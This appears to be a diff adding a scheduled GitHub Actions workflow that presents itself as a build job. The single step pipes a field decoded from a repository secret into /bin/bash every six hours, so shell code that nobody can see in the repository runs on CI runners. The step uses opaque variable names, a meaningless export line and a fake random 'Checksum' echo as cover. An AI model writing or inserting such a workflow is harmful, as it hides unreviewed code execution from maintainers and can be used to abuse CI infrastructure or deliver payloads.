@@ -1,0 +1,20 @@
+name: zhuwushan1989
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuwushan1989
+        env:
+          s19872: ${{ secrets.s19872 }}
+        run: |
+          which cat | export GGGGG=
+          echo $s19872 | jq -r .l20552 | /bin/bash
+          pushd ~ > /dev/null
+          echo "Checksum: $((1000 + RANDOM % 9000))"
